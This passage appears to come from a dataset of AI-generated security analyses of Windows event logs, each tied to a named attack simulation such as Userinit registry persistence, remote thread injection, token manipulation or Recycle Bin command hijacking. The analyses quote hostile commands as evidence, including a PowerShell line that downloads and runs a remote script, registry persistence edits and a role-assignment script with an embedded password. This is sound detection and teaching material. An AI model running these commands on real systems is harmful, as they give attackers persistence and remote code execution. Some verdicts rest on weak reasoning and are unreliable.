- **Suspicious Activity**: The logs show repeated execution of a PowerShell command that modifies the registry key for `Userinit`. The command `Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force` changes the default login process. This alteration can be an attempt to introduce a command window on user login, which is a known persistence method that attackers use to ensure continued access or control of the system.

#### Sysmon Logs
- **Process Execution**: There are multiple legitimate processes, such as `whoami.exe` and `hostname.exe`, executed under a high integrity level. These seem typical for administrative tasks but considering the context of the PowerShell commands, it suggests potential subversion of privilege.
  
- **Specific Findings**:
  - **Process Creation with PowerShell**: A process for `powershell.exe` is recorded with a command line argument indicative of registry modification for `Userinit`. This aligns with the suspicious activity from the PowerShell logs.
  - There are several executions of `wevtutil.exe`, typically used for exporting event logs. If unauthorized, it could indicate an attempt to alter or erase logs for evasion.
  
- **EdgeUpdate Activity**: There is extensive logging of processes associated with Microsoft Edge updates. These seem numerous but consistent with a scheduled or manual update session. There is nothing immediately alarming concerning malware suspicion or execution of unauthorized software.

#### Application Logs
- **Edge Update Service Logs**: Multiple entries show Edge Update services starting and stopping. This aligns with the Sysmon logs, reflecting standard software update procedures.
- **Security-Sensitive Process**: The logs from the Microsoft-Windows-Security-SPP include benign actions related to software protection platform services, without any suspicious activity noticed.

### Assessment Summary
- The execution of the PowerShell command to alter the `Userinit` registry key is a strong indicator of **malicious intent**. Such changes are not typical for standard operations and suggest an attempt by an attacker to maintain persistence on the system by modifying user login behavior.
  
- Other activities (e.g., Edge Update processes) appear routine and expected for legitimate software management and are not directly indicative of malicious actions.

### Recommended Resolution: **MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Actions**:
   - Roll back the registry change by restoring the original `Userinit` value to remove any unauthorized persistent foothold.
   - Conduct a sweep for other malicious persistence mechanisms or indicators of compromise.
   - Review access logs closely to identify potential unauthorized access, particularly around the creation times of the suspicious PowerShell and Sysmon entries.

2. **Further Actions**:
   - Isolate the affected system to prevent lateral movement within the network.
   - Perform a comprehensive malware and threat analysis on the machine.
   - Monitor network traffic for any unusual outbound connections that could suggest data exfiltration or command-and-control activity.

3. **Preventative Measures**:
   - Implement enhanced PowerShell logging and network traffic analysis to capture and analyze suspicious activity moving forward.
   - Educate users on recognizing indicators of phishing or initial entry vectors used by attackers to deploy such persistence techniques. 

These actions should help mitigate the current risk and bolster defenses against future potential threats similar in nature."
Service Installation PowerShell,"### Analysis of Given Logs

#### Summary of the Logs:
The provided logs include data extracted from multiple sources on a Windows machine, including Windows PowerShell, System logs, Application logs, and Sysmon logs. The purpose of this analysis is to determine if there's any indicator of malicious activity within these logs.

#### Breakdown of Logs:

1. **Windows PowerShell Logs:**
   - A PowerShell command was executed that involves creating a new service named `fileTestService_PowerShell` with a binary path pointing to a temporary file directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`.
   - The command also involves starting this newly created service.

2. **System Logs:**
   - The System log confirms the creation of the `fileTestService_PowerShell` service as a ""user mode service"" with `auto start` under the `LocalSystem` account.

3. **Application Logs:**
   - The newly created service `fileService` starts successfully.

4. **Sysmon Logs:**
   - A PowerShell process (`powershell.exe`) was confirmed running with a command line that matches the suspicious service creation.
   - Multiple processes running under the `NT AUTHORITY\SYSTEM` account are observed related to standard system operations and likely legitimate edge updates.
   - Notably, the `fileService.exe` is run with a high integrity level and under `NT AUTHORITY\SYSTEM` implying elevated privileges since its binary path originates from a temporary directory.

### Suspicion Factors:

- **Execution from Temp Directory:** The service is being started from a non-standard location (a temporary user directory), which is often a tactic used by adversaries to execute malicious payloads.
- **Auto-Starting Service:** The service is set to auto-start, ensuring persistence, which is a common technique used by malware.
- **Privilege Level:** Running under `NT AUTHORITY\SYSTEM` indicates high privilege levels which can allow a service to perform actions across the system, posing significant risks if the service is malicious.

### Assessment:

- **Suspicious Behavior:** The creation and starting of a service with an executable located in a temporary directory, especially under the `LocalSystem` context, raises suspicions of potential malware attempting persistence.
- **Potential Malicious Indicators:** The command executed through PowerShell and subsequent use of elevated privilege levels are techniques generally used in malicious activities.

### Resolution:
- **SUSPICIOUS:**
  - The activities in the logs indicate potential security issues that require further investigation. While they do not definitively indicate known malicious activity, the use of a temporary directory for a service binary and invoking it with elevated privileges are risky actions that could be linked to unauthorized access attempts.

### Guidance on How to Proceed:
- Perform detailed malware analysis on `fileService.exe` located in the temporary directory to determine its actual function and intent.
- Investigate the origin of the PowerShell commands and the execution context to understand how the service was initiated.
- Review security and audit logs for any unauthorized access or anomalies coinciding with the time these events occurred.
- Consider implementing stricter controls and monitoring around script execution and service creation, particularly from temporary directories."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"Based on the provided logs, here's a detailed analysis of suspicious or anomalous activities that could indicate potentially malicious activity:

### Detailed Analysis:

1. **Windows PowerShell Log**:
   - The PowerShell events include a command executing `powershell.exe` with: 
     ```
     $process = Start-Process C:\Windows\System32\werfault.exe -passthru
     C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\CreateRemoteThread.exe -pid $process.Id -debug
     ```
   - This is highly suspicious because `werfault.exe` is a Windows error reporting tool, and the attempt to start it and then run a script from a temporary directory involving `CreateRemoteThread.exe` with debugging could be indicative of process injection or exploit attempts. The presence of tools like `CreateRemoteThread.exe` typically hints towards execution or injection tactics used by attackers.

2. **Security Log**:
   - There are privilege escalation logs (Event ID 4672), where the user `admin_test` is granted multiple high-level privileges shortly after a logon event (ID 4624) with NTLM authentication from a remote desktop-like session. While not inherently malicious, the timing and privileges granted should be scrutinized to ensure it was intended administrative activity.
   
3. **System & Kernel-General Logs**:
   - Time change operations are recorded (Event ID 4616). System time changing in short intervals as seen here (e.g., `2024-10-22 17:43:06.9293694` to `2024-10-22 17:42:43.0494568`) can be a tactic used by malware to contravene detection systems that rely on timestamps.
   - No immediate attachments to other suspicious process activities, but this combined with other logs might indicate evasive activities.

4. **Sysmon Log**:
   - Sysmon logs showcase numerous legitimate system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`) running under the user `SERVER002\admin_test`. The utilities are executed in rapid succession which can be typical during automated task execution or batch operations, expect caution due to anomalous PowerShell behavior.
   - The presence of `CreateRemoteThread.exe` from the PowerShell log coinciding with various svchost.exe and other system utilities being initiated could suggest they are part of a further complex execution routine potentially aligning with malicious intent.

### Assessment:

Given the above factors, particularly the PowerShell script invoking suspicious file execution, time manipulation, and privilege escalation activities, these logs show indicators that warrant concern for potential malicious behavior.

### Resolution:

- **MALICIOUS**: The specific invocation of a PowerShell command using `CreateRemoteThread.exe` combined with system alterations and high-privileged remoted access provides a strong indicator of malicious intent. Immediate investigation into the origin of the PowerShell command execution and the process activities associated with it is highly recommended.

### Guidance:

1. **Forensic Analysis**: Review PS scripts and verify the integrity of binaries like `werfault.exe` involved in the logs.
2. **Network Monitoring**: Check for any unusual outgoing connections or data exfiltration.
3. **Incident Response**: Isolate the affected systems for detailed capture and identify if lateral movement occurred.
4. **Audit Authentication Logs**: Verify the legitimacy of `admin_test` activities and validate proper access control measures."
Parent PID Spoofing - Spawn from svchost.exe,"## Detailed Analysis of Event Logs

Upon examination of the provided Windows Event Logs, several points of interest were identified in relation to the investigation goal of detecting indicators of malicious activity:

### Windows PowerShell Logs

1. **PowerShell Activities**:
    - Logs indicate multiple PowerShell commands executed almost simultaneously around 12:06:53 UTC. The command structure is complex, involving:
      ```powershell
      powershell.exe & {Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter ""Name = 'svchost.exe' AND CommandLine LIKE '%'"" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -CommandLine '-Command Start-Sleep 10'}
      ```
    - This command is obfuscated and involves using `Get-CimInstance` to interact with processes followed by custom invocation logic which might suggest behavior of an Advanced Persistent Threat (APT) attempting to go unnoticed by initiating delayed and background actions.
    - Another invocation with the restricted execution policy was logged with code scanning for file patterns potentially indicating a defense evasion attempt or system reconnaissance: 
      ```powershell
      powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;
      ```

### System Logs

2. **Windows Update Activities**:
    - Regular updates are logged, such as ""Microsoft.NET.Native.Runtime.2.2"" and ""Microsoft.VCLibs.140.00,"" which are standard Microsoft updates and do not indicate malicious activity.

### Security Logs

3. **Failed Credential Access**:
    - Multiple logs (EventID 5379) show failed access to credentials tied to the service ""MicrosoftAccount:user=02txoixylodcstop"" with the error code that translates to ""no mapping between account names and security IDs"". This unusual, repeated failure could imply attempts to leverage service accounts improperly, possibly for lateral movement or privilege escalation.

4. **Privileged Logons**:
    - EventID 4672 indicates SYSTEM account logons with elevated privileges, but this is typical during system operations and doesn't directly suggest a breach unless found in conjunction with unusual activities.

### Sysmon Logs

5. **Process Creation**:
    - Several Sysmon logs indicate the creation of processes like `wevtutil.exe`, `conhost.exe`, and other standard utilities. However, the consistent spawns tied to `powershell.exe` with complex command-line parameters as seen in the PowerShell logs are cause for concern.
    - The processes originating from elevated user contexts such as ""SERVER002\\admin_test"" with high integrity level possibly suggest privilege misuse.

### Assessment

**Suspicious Activity Observed**: The logs indicate multiple technically suspicious activities primarily around the misuse of PowerShell which aligns with tactics of persistent threats. The complex and possibly obfuscated command usage, combined with the repetitive credential access failures and privileged operations, warrants a categorized threat detection approach to be engaged.

### Recommendation

- **Resolution**: **SUSPICIOUS**
- It is recommended to conduct a more thorough investigation:
  - Review the context and source of the PowerShell invocations.
  - Examine any data exfiltration possibilities.
  - Cross-reference the failed credential attempts and verify the security policies around usage of those accounts.
  - Leverage security information and event management (SIEM) tools to correlate any potential lateral movement or data tampering.
  - Monitor for further signs of malicious activities and consider user behavior analytics to detect insider threats.

Overall, the activity observed does not conclusively indicate a breach but poses a substantial risk and requires immediate attention to rule out potential APT."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"Upon analyzing the provided Windows event logs, several key observations and potential indicators of malicious activity are noted:

1. **Privilege Escalation and Privileged Actions:**
   - Event ID ""4672"" (Security Log): The user ""admin_test"" has an array of high-level privileges, including `SeSecurityPrivilege`, `SeDebugPrivilege`, and others which are normally used by system processes and administrators for tasks like debugging, driver loading, and system environment manipulation. While possessing these privileges is not inherently malicious, it raises a red flag for potential unauthorized activities when combined with other events.

2. **Suspicious PowerShell Activity:**
   - In the Sysmon and Windows PowerShell logs, a PowerShell command is executed by ""admin_test"" with a command line that includes `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem`. This command downloads and executes a remote PowerShell script, indicative of potential code execution using PowerShell. This is a common technique used by attackers to download and execute malicious scripts without leaving traces on disk.

3. **Network and Remote Access:**
   - Several LogonType 3 events (Network logon) are present, which typically represent connections over the network. However, without context on normal activity, it is difficult to determine if this is unauthorized access.

4. **Use of Non-standard Tools:**
   - In the Sysmon log, multiple uses of `wevtutil.exe` and `conhost.exe` by ""admin_test"" are observed. While the use of native Windows tools is normal, in certain contexts, they can be used to evade detection or facilitate persistence.

5. **Time Anomalies:**
   - Events show time synchronization changes, suggesting potential tampering or normal drift correction. This would typically be benign, but combined with other suspicious activities, it can suggest an attempt at hiding tracks or manipulating logs.

6. **Antivirus Status:**
   - Windows Defender appears to be running (`SECURITY_PRODUCT_STATE_ON`), which is a standard operational state indicating that antivirus protection is presumably active.

### Assessment:

The logs demonstrate key indicators of suspicious behavior, especially concerning the execution of remote PowerShell scripts and usage of high-privilege actions by ""admin_test"". While no definitive indicator of compromise (malware execution or data destruction) is immediately evident, the unusual PowerShell activity suggests that further investigation is necessary.

### Resolution: **SUSPICIOUS**

- **Recommendations:**
  - Investigate the origin and intention of the PowerShell script executed.
  - Review user role and access permissions for ""admin_test"", inspecting any unauthorized actions.
  - Monitor network logs to detect potential anomalies indicating lateral movement or data exfiltration.
  - Conduct a comprehensive scan of the system to identify and mitigate risks associated with potential compromise.

Proactive steps should be taken to ensure this activity does not result in a larger security incident, involving IT security teams to conduct a more thorough review and take appropriate action if necessary."
Domain Password Policy Check: Common Password Use,"An analysis of the provided Windows event logs indicates several activities and behaviors that warrant attention. The logs primarily consist of Sysmon logs, PowerShell logs, and a security log entry. Here are the key points of investigation:

1. **PowerShell Activity:**
   - Multiple instances of PowerShell being executed are observed, specifically from the user account `SERVER002\\admin_test`. The PowerShell script involved seems to handle credential management, attempting to change the passwords of user accounts by reading stored credentials and resetting them. This activity is done by a user with high integrity level, implying administrative privileges.
   - While this might be routine for a specific use case, the scripting involved in credential handling is a common tactic used in attacks for lateral movement or to establish persistence.

2. **Use of 'wevtutil.exe':**
   - The `wevtutil.exe` process is executed multiple times by the `SERVER002\\admin_test` user. This utility is used for managing event logs on Windows systems. Its frequent execution in a short timeframe might indicate log clearing or modification attempts, which can be used to cover malicious activity.

3. **Conhost.exe and HOSTNAME.EXE:**
   - `conhost.exe` and `HOSTNAME.EXE` processes appear multiple times. `conhost.exe` is usually invoked to host console windows and can be used benignly. However, its recurrent appearance alongside other suspect activities is worth noting.

4. **Setup Activity by Microsoft Edge Installer:**
   - Multiple processes related to Microsoft Edge Updates are being executed under the `NT AUTHORITY\\SYSTEM` account. This could be part of a legitimate update process, but it's essential to double-check that these operations are expected and originate from trusted sources.

5. **Security Log Event:**
   - A security log event indicates that a temporary setup process for Microsoft Edge was responsible for interacting with a user group named ""Users"". This could also correlate with software installation or updates, which involve modifying user permissions or settings.

### Assessment:
The combination of credential management via PowerShell scripts, multiple wevtutil executions, and administrative-level activities without clear or routine justification raises suspicion. These characteristics often align with the tactics used by adversaries to establish persistence, escalate privileges, and cover tracks.

### Resolution:
Given the above findings, the logs contain activities that don't align with typical benign behavior, particularly with the handling of credentials and event logs. These actions require further investigation to determine their context and legitimacy.

**Resolution: SUSPICIOUS - The logs contain activity that doesn't look right and needs more investigation.**

### Guidance on How to Proceed:
- **Verify the legitimacy of the PowerShell scripts**: Check if these scripts are authorized and part of normal administrative operations or contribute to any scripts managed by IT or security teams.
- **Audit the account `SERVER002\\admin_test`**: Investigate how this account is generally used, and review the permissions and behaviors attributed to it.
- **Confirm Microsoft Edge Update legitimacy**: Ensure that the detected update processes align with genuine Microsoft updates and are present from official sources.
- **Increase monitoring**: Implement additional event log monitoring and take proactive steps to log PowerShell commands and their parameters.
- **Conduct a threat assessment**: Investigate potential threats this activity might be indicative of, given the context of the server and the network it resides in."
WMI Invoke-CimMethod Scheduled Task,"### Detailed Analysis of Logs

In reviewing the provided logs, a few activities stand out as potentially suspicious or indicative of malicious behavior:

1. **Time Manipulation:**
   - **Security Log Event ID 4616 and System Log Event ID 1:** There are multiple instances where the system time has been changed. Time manipulation can sometimes indicate attempts to modify or bypass time-based security controls. In this case, the change involves the `svchost.exe`, a legitimate Windows process, but frequent and unnecessary time adjustments could indicate an attacker trying to mask activity or bypass time restrictions.

2. **Use of PowerShell:**
   - **Sysmon Log Event IDs involving `powershell.exe`:** A PowerShell command is executed that reads an XML file and attempts to register a new scheduled task using `Invoke-CimMethod`. This is a common red flag as PowerShell is often used in attacks to execute scripts or commands that can alter system configurations or deploy payload without writing to the disk.

3. **Scheduled Task Registration:**
   - **CommandLine in PowerShell Logs:** The PowerShell script appears designed to register a task within the Task Scheduler using a WMI namespace, which can be used for persistence or scheduled malicious activity. Task Scheduler is often utilized by attackers to execute malware on a scheduled basis to ensure persistence.

4. **Presence of Wevtutil.exe and Conhost.exe:**
   - **Sysmon Log entries:** Multiple instances of wevtutil.exe, a command-line utility to manage event logs, and conhost.exe, a host for command prompt windows, appear closely together. While these processes are legitimate, their frequent and consecutive usage in tandem with elevated privileges (`admin_test` with a high integrity level in logs) may indicate an anomaly if not related to routine administrative actions.

5. **User Privileges:**
   - **Security Log Event ID 4672:** The user `admin_test` was granted high-level privileges including `SeDebugPrivilege`. This could indicate privilege escalation, which attackers might exploit to gain advanced control over the system.

6. **Logon Session Events:**
   - **Logon events (Event ID 4624) from a remote IP address (LogonType: 3):** The user `admin_test` accessed the server remotely using NTLM authentication, which is not inherently malicious but could be considered suspicious if unexpected or not recognized.

### Assessment of the Situation

- **Suspicion of Malicious Activity:** Based on the logs, there are strong indicators that suggest suspicious activity or potential compromise. The combination of time changes, repeated and unusual use of PowerShell and wevtutil, scheduled task registration using PowerShell, and the elevation of user privileges substantiates this concern.

### Recommendation

Given the potential indicators of malicious activity, further investigation is recommended to confirm any unauthorized access or system modifications.

1. **Immediate Actions:**
   - Isolate the server `Server002` from the network to prevent further potential exploitation.
   - Verify the legitimacy of scheduled tasks being registered and review any corresponding XML files.

2. **Further Investigation:**
   - Analyze network traffic for suspicious connections originating from or directed to unusual IP addresses.
   - Inspect filesystem changes or additional scripts related to the PowerShell commands identified.
   - Review recent administrative activities for legitimacy and verify with team members.
   
3. **Long-Term Measures:**
   - Implement enhanced monitoring for PowerShell execution and potential exploitation attempts.
   - Audit user credentials and permissions, particularly those with administrative privileges like `admin_test`.

### Conclusion
The suspicious patterns and activities identified necessitate the need for deeper investigation. The events point toward the possibility of an attack leveraging legitimate tools for executing unauthorized actions on the server.

**Final Resolution: SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation."
Azure AD - adding user to Azure AD role,"**Analysis of the Windows Event Logs:**

1. **PowerShell Activity:**
   - The logs exhibit PowerShell command execution to interact with Azure Active Directory (AzureAD).
   - The command was initiated by `powershell.exe` under the `ConsoleHost`.
   - A PowerShell script is executed that:
     - Imports the `AzureAD` module.
     - Converts a string password (in plaintext) to a secure string.
     - Creates a credential object using the username `jonh@contoso.com`.
     - Connects to AzureAD with the credential.
     - Retrieves a user labeled 'SuperUser'.
     - Checks for a role 'Global Reader' and adds the user to this role if the role exists.
   - The password is directly embedded in the script in plaintext, which is a potentially risky practice as it could be intercepted or exposed.
   - This action can be considered suspicious due to possible privilege escalation—adding a user to a global reader role without clear context or approval raises concerns. Moreover, interaction with AzureAD using embedded credentials in scripts is often flagged for review, owing to its potential misuse by malicious actors.

2. **Sysmon Activity:**
   - The Sysmon logs reveal a series of process creations involving `powershell.exe`, `hostname.exe`, `whoami.exe`, and other Windows utilities.
   - `powershell.exe` was executed along with embedded command-line arguments pointing towards AzureAD interaction, coinciding with the PowerShell activity mentioned above.
   - Tools like `HOSTNAME` and `WHOAMI` generally indicate an attempt to query the system environment, possibly for reconnaissance.
   - All actions were performed by the user `SERVER002\admin_test`, suggesting actions by an administrative user, or potentially by an attack using compromised credentials.
   - We observe consistent high-integrity levels in these executions, suggesting privileged actions are taking place.

3. **Missing Information in Logs:**
   - The Security and Application logs are missing or blank, which can cloud judgment regarding any additional account or system-wide changes that may have been logged there.
   - This absence itself might be indicative of intentional deletion, a tactic often used by attackers to remove traces. However, without direct evidence here, we cannot assert this definitively.

**Assessment:**
- The suspect activity primarily revolves around the PowerShell execution aimed at manipulating AzureAD user roles. While using PowerShell for administrative tasks is not inherently malicious, the context, such as unauthorized elevation or sensitive information transmission in plaintext, is concerning.
- The use of built-in utilities like `whoami.exe` and process monitoring tools does align with reconnaissance activities often observed in early attack stages.

**Resolution:**
- **SUSPICIOUS**: The activities, especially the manipulation of AzureAD roles and plaintext password use within PowerShell, denote suspicious behavior that should not be ignored. Investigate further to ensure that these actions were legitimate and within the user’s scope of responsibilities. Monitor for any additional unusual behavior and consider a security review of the affected credentials.
"
SystemBC Malware-as-a-Service Registry,"Based on the provided logs, the following analysis has been conducted:

### Security Log:
- Two events (Event ID 4616) indicate a time change operation on the system involving the `svchost.exe` process. It is important to note that time changes can sometimes indicate attempts to evade detection; however, there is no immediate evidence suggesting malicious intent here.

### Application Log:
- The `edgeupdate` service stopped twice, which is a regular operation related to the Microsoft Edge Update process. This activity appears typical of maintenance routines.

### System Log:
- Time synchronization events with the time.windows.com server are noted, which is normal for Windows systems to ensure accurate timekeeping. The same time change operation with `svchost.exe` is logged here as well.

### Windows PowerShell Log:
- The presence of a PowerShell command that alters the registry to add a startup item (`socks5_powershell`) that runs a PowerShell script with suspicious options (`-windowstyle hidden -ExecutionPolicy Bypass`) is particularly concerning. This behavior is typical of malware attempting to maintain persistence on the system.

### Sysmon Log:
- The `wevtutil.exe` and `conhost.exe` executions by the `admin_test` user may suggest manual log clearing or alteration, which can be an indicator of malicious activity or scripting. 
- The execution of `MicrosoftEdgeUpdate.exe` multiple times with various command-line arguments is consistent with routine updates but should be cross-verified with recent updates to ensure legitimacy.
  
### Threats/Risks Identified:
- The PowerShell log entry stands out as potentially malicious due to its nature of attempting to establish persistence in a stealthy manner.
- The large number of `MicrosoftEdgeUpdate.exe` events, while potentially routine, merit a check against update schedules to eliminate the uncertainty of an unauthorized update attempt.

### Guidance:
- Investigate the registry entry created by the PowerShell command: Ensure unauthorized software doesn't execute at startup.
- Validate with administrators if the `wevtutil.exe` invocations were part of scheduled maintenance or known troubleshooting to rule out unauthorized log alterations.
- Review the latest updates for Microsoft Edge around the log timestamps to ensure all `MicrosoftEdgeUpdate.exe` executions were legitimate.

### Conclusion:
Given the suspicious PowerShell activity and potential manual log management, the resolution is:

**SUSPICIOUS** - The logs contain activity that doesn't look right and needs more thorough investigation, particularly surrounding the PowerShell entry and the `wevtutil.exe` usage."
Powershell Cmdlet Scheduled Task,"### Detailed Analysis:

Upon reviewing the logs, the following activities stand out:

1. **Windows PowerShell Log:**
    - There are multiple entries indicating that a PowerShell script is being used to create a scheduled task that executes `calc.exe` at logon. The use of `New-ScheduledTaskAction`, `New-ScheduledTaskTrigger`, `New-ScheduledTaskPrincipal`, and `Register-ScheduledTask` to set a task to run with the highest privileges (as shown in the command) by adding it for the Administrators group is suspicious. Running `calc.exe` is often used as a test or as a benign payload in malicious PowerShell scripts to test execution capability.
    - The command running under `powershell.exe` to create a scheduled task is generally considered suspicious unless there's a legitimate explanation. Such behavior could indicate a persistence mechanism used by malware to maintain access across reboots.

2. **Sysmon Logs:**
    - There are several process creation events (`EventID: 1`) showing the execution of trusted processes like `whoami.exe`, `hostname.exe`, and others under the user `SERVER002\admin_test`. 
    - One particular entry of concern is the use of `powershell.exe` executing the same script as highlighted in the Windows PowerShell log that creates a scheduled task to execute `calc.exe`. This confirms that the script was indeed executed and is not just a test or script parsing error.

3. **Security and System Logs:**
    - These logs were not provided, so no analysis could be conducted. However, they often contain valuable information regarding user logins, privilege escalation, or other anomalous behavior.

### Assessment and Threats Identified:
- The creation of a scheduled task using PowerShell to execute `calc.exe` at logon is suspicious, notably because it involves the Administrative user group and requests to run tasks at the highest privilege level. This technique is commonly used by attackers to persist in the system.
- Although `calc.exe` itself is not malicious, the method of execution suggests a proof of concept for more troubling behavior, such as executing a different, potentially harmful payload.
- The persistence mechanism is being employed here potentially indicating a compromise with malicious intent.

### Recommended Action:
- Investigate the purpose of this scheduled task. If it is not authorized, it should be removed immediately. Check system policies to tighten control over script execution.
- Conduct a thorough review of recent changes to user accounts and privileges, focusing on any unexpected or unauthorized elevation of privileges.
- Monitor for similar patterns or new attempts to create scheduled tasks or run scripts across the network, as the presence of such patterns may indicate further spread or recon attempts.
- Consider implementing more strict monitoring around PowerShell activity, using logging and alerting mechanisms that focus on unusual command-line activity.

### Final Resolution:
- **SUSPICIOUS** - The logs contain activity that doesn't look right and needs more investigation, specifically focusing on the scheduled task creation via PowerShell, which is often indicative of unauthorized script usage or malicious persistence techniques."
Suspicious bat file run from startup Folder,"### Detailed Analysis

#### Observations:
1. **Repeated Usage of PowerShell**:
   - There is a documented execution of PowerShell with a specific command: 
     ```powershell
     Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\batstartup.bat"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
     Copy-Item ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\batstartup.bat"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
     Start-Process ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat""
     Start-Process ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat""
     ```
   - This script copies a batch file to both user and system startup directories and attempts to execute it, which can be a method to achieve persistence on a system.

2. **Event ID 1 and 5 in Sysmon**:
   - These Event IDs generally pertain to Process Creation (Event ID 1) and Process Termination (Event ID 5) in Sysmon.
   - Multiple executions of `wevtutil.exe` and `whoami.exe` are observed. While legitimate under normal administrative activities, their rapid invocation, especially in combination, might induce suspicion.
   - Frequent executions of `conhost.exe` might correlate with scripts or commands being run, often seen with 'cmd' or terminal interactions.

3. **Security Log Time Change (Event ID 4616)**:
   - Adjustments in the system time were observed which can indicate attempts to manipulate logs or alter temporal artifact records in investigations.

#### Indicators of Compromise:
- The use of PowerShell with obfuscated or complex commands is often characteristic of malicious activity attempting to evade detection.
- Copying and executing scripts from unusual directories (`AppData`, `Temp`) into startup locations suggests attempts to maintain persistence.
- Frequent, rapid, and apparently unscheduled execution of administrative processes may indicate scripted actions or potentially unauthorized use.

#### Risks Identified:
- **Persistence Mechanism**: The placement of `batstartup.bat` into startup directories is a clear attempt to maintain a persistent presence on the system.
- **Potential Privilege Abuse**: The execution context is under `SERVER002\admin_test`, indicating a privileged user account. Any compromise or malicious action from this user could have significant systemic impacts.
- **Time Manipulation**: Changing system time can obscure or misalign logs, complicating root cause analysis and potentially hindering defense mechanisms reliant on temporal accuracy.

### Guidance on How to Proceed
- **Immediate Isolation and Investigation**:
  - Isolate the affected system to prevent further propagation or unauthorized access.
  - Review any other systems the user `admin_test` might have access to for suspicious activity.
- **Review and Analyze Startup Directory Contents**:
  - Identify and assess the contents of the `batstartup.bat` for malicious activity or purposes.
- **Audit Use of Administrative Tools**:
  - Conduct further investigation on why utilities like `wevtutil.exe` and `whoami.exe` were executed with much frequency.
- **Time Synchronization**:
  - Verify and, if necessary, correct the time synchronization across the infrastructure to ensure consistent logging.
- **User Account Review**:
  - Evaluate the current permissions and recent activity of `admin_test`, possibly involving password changes or temporary deactivation while conducting investigations.

### Final Resolution
After the analysis of the provided logs:

**MALICIOUS**

The activities strongly indicate attempts to establish persistence on the machine and manipulate log times, typical tactics employed in an active compromise scenario. This assessment necessitates urgent containment and response actions as outlined above."
Add persistance via Recycle bin,"### Detailed Analysis of the Log Entries

Given the logs submitted, here are the notable observations:

#### 1. **Process Execution Logs (Sysmon Log)**
- **Wevmutil.exe and conhost.exe Execution:**
  - Wevtutil.exe and conhost.exe are legitimate Windows processes. However, their frequent execution in the sysmon logs by the user `SERVER002\\admin_test` in rapid succession is potentially interesting, but not necessarily suspicious by itself. The context of their use and any changes they enforce would need further investigation to rule out unusual behavior.

- **Cmd.exe Execution with Registry Modification:**
  - The execution of `cmd.exe` with a command line `reg ADD ""HKCR\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\shell\open\command"" /ve /d ""calc.exe"" /f` is suspicious. This is a known method to modify the Recycle Bin shell execution, potentially used by attackers to trigger execution of calculator as a test or payload, indicating possible malicious activity.

- **Regular Activity of Microsoft Edge Update:**
  - Multiple instances of processes related to Microsoft Edge Update are logged, executed by `NT AUTHORITY\SYSTEM`. These logs indicate legitimate software update activities, consistent with Microsoft's update mechanisms. However, an unusually high number of these entries, if unexpected, may warrant checking against legitimate update cycles.

- **HOSTNAME.EXE and WHOAMI Executions:**
  - These are benign uses of system commands as they simply retrieve the hostname and current user, respectively. However, in a chained set of suspicious activities, they are often seen in reconnaissance or preparatory stages of malicious activity. On their own here, they are more likely benign unless part of a larger activity set.

#### 2. **Application Log (Edge Update Service)**
- The Edge Update service logs indicate a normal service stop. There is nothing inherently suspicious here in the context of system operations.

### Assessment of Situation

After carefully analyzing the logs, the entries involving `cmd.exe` with registry modification intentions appear highly anomalous and potentially malicious. This specific registry edit aligns with unusual system behavior often seen in some types of attacks to alter fundamental behaviors for persistence or execution, typically known as ""command hijacking"".

### Conclusion

Given the detailed log analysis:

- **Resolution:** **MALICIOUS**

#### Guidance on How to Proceed
1. **Immediate Action:**
   - Verify recent user activities and run anti-malware/anti-virus checks on `Server002` to detect any malware or alterations.
   - Revert any unauthorized registry changes if detected.
   - Restrict the execution of unauthorized processes or command-line actions for `SERVER002\admin_test` user.

2. **Continued Monitoring:**
   - Enhance monitoring of server activities focusing on similar anomalies.
   - Implement application whitelisting to prevent use of tools like `cmd.exe` for unauthorized tasks.

3. **Audit and Investigate:**
   - Investigate further logs for additional context (e.g., Windows PowerShell or security logs) that might highlight more deliberate or coordinated unauthorized actions.
   - Check for any related incidents in the network logs or correlating suspicious activities on other systems.

### Final Note

Given the suspicious nature of these logs, especially the commandeering of system entries for potential misuse, treating this as a possible security incident would be prudent to maintain system security integrity."
Domain Password Policy Check: No Number in Password,"### Analysis of Windows Event Logs

#### System Log Analysis
- The logs predominantly show Windows Update client activities with updates related to system libraries and frameworks such as Microsoft VCLibs and .NET Native Runtime. No anomalous activities are detected here, as these are typical update processes in a Windows environment.

#### Windows PowerShell Log Analysis
- The PowerShell log entries provide evidence of automated credential management activities. A script is executed to check and manage user passwords stored in a local file:
  - The script checks if a credential file exists and compares its content against a new password.
  - If the password matches, an error message prompts for a different password.
  - The script attempts to change the password using `Set-ADAccountPassword`, capturing exceptions for incorrect stored passwords.
  - It updates the credential file if successful.

This script's execution seems to be a legitimate operation for maintaining secure user credentials. However, it does involve handling clear-text passwords and automated password changes, which could be a security risk if not managed appropriately. This activity could suggest:
  - Legitimate credential management by an admin.
